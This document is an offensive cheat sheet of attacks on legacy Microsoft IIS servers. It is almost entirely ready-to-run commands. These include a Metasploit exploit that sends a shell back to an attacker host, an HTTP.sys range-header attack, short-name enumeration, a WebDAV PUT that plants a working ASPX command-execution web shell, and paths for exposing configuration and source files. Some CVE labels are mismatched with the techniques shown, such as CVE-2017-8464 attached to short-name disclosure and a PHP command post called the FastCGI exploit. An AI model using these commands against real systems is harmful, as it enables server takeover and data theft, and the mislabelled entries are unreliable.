# Old IIS Vulnerabilities

## 1. CVE-2017-7269 — WebDAV RCE
```bash
# IIS 6.0 WebDAV ScStoragePathFromUrl buffer overflow
msfconsole -q -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl; set RHOSTS target; set LHOST attacker; run"
```

## 2. CVE-2015-1635 — HTTP.sys RCE
```bash
# IIS 7.5-8.5
curl -sk "http://target/" -H "Range: bytes=0-18446744073709551615"
```

## 3. Short Name Disclosure (CVE-2017-8464)
```bash
# Enumerate short filenames
curl -sk "http://target/*~1*/.aspx"
curl -sk "http://target/*~1*/*"
# Use IIS ShortName Scanner
java -jar iis_shortname_scanner.jar 0 5 http://target/
```

## 4. WebDAV
```bash
# Check WebDAV
curl -sk -X OPTIONS "http://target/"
curl -sk -X PROPFIND "http://target/"
# PUT files
curl -sk -X PUT "http://target/shell.aspx" -d '<%Response.Write(new System.Diagnostics.Process{StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}).Start().StandardOutput.ReadToEnd();%>'
```

## 5. ISAPI Extensions
```
# .printer (Internet Printing)
# .ida/.idq (Index Server)
# .htr (Password reset)
```

## 6. web.config Exposure
```
/web.config
/web.config.bak
```

## 7. Global.asax Exposure
```
/Global.asax
/Global.asax.bak
```

## 8. aspnet_client
```
/aspnet_client/
/aspnet_client/system_web/
```

## 9. CVE-2010-2730 — FastCGI RCE
```bash
# IIS 7.5
curl -sk "http://target/index.php" -d '<?php system("id");?>'
```

## 10. Source Code Disclosure
```
# +.htr
/default.asp+.htr
# ::$DATA
/default.asp::$DATA
```

## Detection
```bash
curl -sk "http://target/" -I | grep -i "Microsoft-IIS"
curl -sk -X OPTIONS "http://target/"
curl -sk "http://target/web.config"
```
